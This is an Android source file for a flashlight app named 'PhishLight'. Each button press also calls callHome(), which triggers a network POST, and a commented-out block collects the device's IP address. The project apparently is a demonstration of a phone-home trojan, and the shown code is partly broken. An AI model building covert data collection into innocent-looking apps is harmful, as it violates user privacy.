package org.rix1.PhishLight;

import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;



public class MainActivity extends Activity {

    /**
     * Called when the activity is first created.
     */

    private Button toggle;
    private ImageView flashlightIcon, light;
    private boolean isFlashlightOn = false;
    private Camera camera;
    private Context context = this;
    private DBhelper dbHelper;
    private NetworkHelper networkHelper;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        flashlightIcon = (ImageView) findViewById(R.id.ic_flashlight);
        light = (ImageView) findViewById(R.id.ic_light);
        toggle = (Button)findViewById(R.id.btn_toggle);
        toggle.setText("ON");
        networkHelper = new NetworkHelper();

        camera = Camera.open();
        final Camera.Parameters p = camera.getParameters();


        toggle.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Log.d("APP: ", "Button clicked");

                callHome();


                if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH)) {
//                    Toast.makeText(context, "No camera found ", Toast.LENGTH_LONG).show();
                }
                if (isFlashlightOn) {
                    Log.d("APP: ", "Flashlight is off");
                    p.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
                    camera.setParameters(p);
                    toggle.setText("ON");
                    light.setVisibility(View.INVISIBLE);
                    isFlashlightOn = false;
                } else {
                    Log.d("APP: ", "Flashlight is ON!");
                    p.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
                    camera.setParameters(p);
                    toggle.setText("OFF");
                    light.setVisibility(View.VISIBLE);
                    isFlashlightOn = true;
                }
            }
        });
    }


    public void callHome() {
        Toast.makeText(this, "Calling home...",Toast.LENGTH_SHORT).show();
        networkHelper.makePOSTRequest();
        networkHelper.execute();
    }

/*  This code is currently not working...
        PhishingHelper phishingHelper = new PhishingHelper(context);
        phishingHelper.insert(getAddress());
        String extract = phishingHelper.getIP(phishingHelper.getAll());
        Toast.makeText(context, extract, Toast.LENGTH_LONG).show();
        *//*

    }


    public String getAddress(){
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        String ip = Formatter.formatIpAddress(inetAddress.hashCode());
                        Log.d("APP: ", "***** IP="+ ip);
                        return ip;
                    }
                }
            }
        } catch (SocketException ex) {
            Log.d("APP: ", ex.toString());
        }
        return null;
    }
*/

    public void databaseTest(){
        dbHelper = new DBhelper(this);
        String insert = "129.04.329294";
        dbHelper.insert(insert);
        Cursor c = dbHelper.getAll();
        String extract = dbHelper.getIP(c);
        Toast.makeText(this, extract, Toast.LENGTH_LONG).show();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        //getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    protected void onStop(){
        super.onStop();
        if(camera != null){
            camera.release();
        }
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
    /*    int id = item.getItemId();
        if (id == R.id.action_settings) {
            return true;
        }
        return super.onOptionsItemSelected(item); */
        return true;
    }
}